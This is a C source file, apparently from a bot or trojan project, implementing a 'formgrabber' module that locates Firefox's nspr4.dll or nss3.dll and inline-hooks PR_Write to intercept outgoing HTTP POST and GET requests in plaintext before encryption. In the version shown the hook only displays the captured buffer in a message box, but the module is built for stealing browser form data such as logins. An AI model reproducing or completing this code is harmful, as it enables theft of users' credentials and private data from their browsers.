#include "nss3.h"

#ifdef MODULE_FORMGRABBER
#include "hook.h"

#include "mem.h"
#include "string.h"

#include "formgrabber.h"

pt_PRWrite oPR_Write;

extern bot_t bot;

int __cdecl PR_Write_Callback(void* fd, const void* buffer, int amount)
{
	if (StrCompareStartA((char*)buffer, "POST /") || StrCompareStartA((char*)buffer, "GET /"))
	{
		MessageBoxA(0, (char*)buffer, 0, 0);
	}

	return oPR_Write(fd, buffer, amount);
}

BOOL WINAPI IsNss3(HMODULE * phMod)
{
	HMODULE hMod;
	unsigned int i;

	LPWSTR module_names[] =
	{
		L"nspr4.dll",
		L"nss3.dll"
	};

	for (i = 0; i < 2; i++)
	{
		if (module_names[i] == NULL) continue;

		if ((hMod = bot.api.pGetModuleHandleW(module_names[i])) != 0)
		{
			*phMod = hMod;
			return TRUE;
		}
	}
	return FALSE;
}

BOOL WINAPI InstallNss3Hooks()
{
	HMODULE hMod;
	unsigned int i;
	LPVOID lpFunctionAddress;
	DWORD dwLength;

	if (!IsNss3(&hMod))
		return FALSE;

	formgrabber_hook_t hooks[] = 
	{
		{"PR_Write", &PR_Write_Callback, (LPVOID*)&oPR_Write}
	};

	for (i = 0; i < sizeof(hooks) / sizeof(formgrabber_hook_t); i++)
	{
		if ((lpFunctionAddress = GetProcAddress(hMod, hooks[i].pszFunctionName)) != 0)
		{
			*hooks[i].lppOriginal = bot.api.pVirtualAlloc(0, 25, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

			if (!HookFunction(lpFunctionAddress, hooks[i].lpCallback, *hooks[i].lppOriginal, &dwLength))
				return FALSE;
		}
	}

	return TRUE;
}
#endif